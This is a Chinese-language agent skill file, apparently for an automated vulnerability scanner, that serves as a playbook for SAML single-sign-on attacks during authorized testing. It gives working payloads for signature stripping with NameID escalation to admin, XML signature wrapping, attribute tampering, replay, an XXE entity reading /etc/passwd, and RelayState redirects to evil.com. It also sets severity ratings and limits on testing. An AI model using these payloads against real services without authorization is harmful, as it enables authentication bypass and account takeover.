---
name: hunt-saml
description: SAML / SSO 断言攻击：签名剥离与断言篡改、NameID 提权、XML 签名包装（XSW）、SAML XXE、Audience/Recipient 校验缺失、RelayState 开放重定向
whenToUse: 目标使用 SAML SSO（URL 含 /saml/acs、/sso/saml、SAMLResponse 参数）或企业 IdP/SP 对接场景
role: vuln-scan
enabled: true
---

# SAML 断言攻击

## 1. 识别

| 信号 | 说明 |
|---|---|
| `POST /saml/acs`、`/sso/saml`、`/auth/saml/callback` | SP 的断言消费端点 |
| 参数 `SAMLResponse`（Base64 XML）、`RelayState` | 标准 SAML Web SSO |
| 302 到 `idp.xxx.com/adfs/ls/`、`/saml2/SSO/POST` | ADFS / Okta / Keycloak |
| 页面 "使用企业账号登录" | SSO 入口 |

## 2. 基础：先看断言长什么样

```bash
# 1. 拦截 POST 到 /saml/acs 的请求
# 2. 取出 SAMLResponse，Base64 解码
echo "$SAMLResponse" | base64 -d | xmllint --format -
```

关键字段：

```xml
<NameID>user@target.com</NameID>          ← 身份
<Attribute Name="role">user</Attribute>   ← 权限
<Conditions NotBefore="..." NotOnOrAfter="...">
<Audience>https://sp.target.com</Audience>
<SubjectConfirmationData Recipient="...">
<Signature>...</Signature>                 ← 要动的是这个
```

## 3. 攻击阶梯（按成功率排序）

### 3.1 签名剥离（最常见）

把整个 `<Signature>...</Signature>` 删除，重新 Base64，提交。

**若仍登录成功 = SP 未强制验签**，P0。

```bash
# 步骤
1. 解码 SAMLResponse
2. 删除 <Signature> 块（含 ds:Signature）
3. 改 <NameID> 为 admin@target.com
4. Base64 编码回填
5. 提交，看是否以 admin 身份进入
```

### 3.2 XML 签名包装（XSW）

保留一个**合法的旧签名**，但把篡改后的断言放在签名验证覆盖范围之外。

经典四种变体：

```xml
<!-- 原始 -->
<Response><Assertion ID="a"><Signature>...</Signature><Subject>...</Subject></Assertion></Response>

<!-- XSW1：复制原断言（带签名）放前面，篡改的放后面 -->
<Response>
  <Assertion ID="a"><Signature>...</Signature><Subject>user</Subject></Assertion>
  <Assertion ID="b"><Subject>admin</Subject></Assertion>
</Response>

<!-- XSW2：用 Extensions 包裹 -->
<!-- XSW3：ID 重命名让签名指向副本 -->
<!-- XSW4：把签名后的断言嵌进篡改断言的 <Extensions> -->
```

工具：`SAMLRaider`（Burp 扩展），内置 XSW 全部变体。

### 3.3 断言属性篡改（若未验签或验签可绕）

```xml
<Attribute Name="role"><AttributeValue>admin</AttributeValue></Attribute>
<Attribute Name="isAdmin"><AttributeValue>true</AttributeValue></Attribute>
<Attribute Name="email"><AttributeValue>admin@target.com</AttributeValue></Attribute>
```

### 3.4 时间条件绕过

```
NotBefore / NotOnOrAfter   改成很宽的范围
或在有效期内重放（replay）
```

**重放测试**：同一个 SAMLResponse 提交两次，第二次仍成功 = 无 replay 防护（P2）。

### 3.5 Audience / Recipient 校验缺失

把 `<Audience>` 改成另一个 SP 的 URL，或删掉，看是否仍接受。
若接受 → 可跨 SP 横向（拿 A 系统的断言登 B 系统）。

### 3.6 SAML XXE

SAMLResponse 解码后是 XML，可直接注入 DTD：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response ...>&xxe;</samlp:Response>
```

盲注用 OOB（见 `hunt-xxe`）。

### 3.7 RelayState 开放重定向

```
RelayState=https://evil.com
RelayState=//evil.com
RelayState=https://target.com@evil.com
```

登录后是否 302 到 evil.com = 开放重定向（可与钓鱼组合）。

## 4. 判定标准

| 现象 | 定性 |
|---|---|
| 签名剥离 + NameID 改 admin → 以 admin 登录 | **P0** |
| XSW 绕过后以他人身份登录 | **P0** |
| 属性篡改生效（role 变 admin） | **P0–P1** |
| 仅 RelayState 开放重定向 | P3 |
| SAML XXE 读到文件 | P1 |
| 验签严格、XSW 全失败 | 不成立（加固正确） |

## 5. 取证

- 必须保存：原始 SAMLResponse（Base64）+ 篡改后 + 两次响应对比。
- 证明「以 admin 身份登录」用**只读页面**（如 `/profile`、`/admin/users` 列表首屏），不做任何写操作。
- 落库 `category=auth-bypass`，附完整断言 XML（脱敏证书/密钥）。
- 与 `hunt-xxe`、`hunt-oauth`、`hunt-jwt-crypto` 联动（SSO 三件套）。

## 6. 不要做的事

- 禁：用 admin 身份做任何写操作/改配置/加账号。
- 禁：读取超出「证明身份」所需的用户数据。
- 禁：对 IdP（企业统一认证）做任何攻击 —— 只打 SP 侧接收端。
- 禁：批量枚举 NameID。
- 禁：把 SAML 断言里的真实证书/密钥贴进报告。

<!-- 改编自: src-hunter references/playbooks/oauth-saml-jwt/11-saml.md + PayloadsAllTheThings/SAML Injection, 2026-11-01 -->
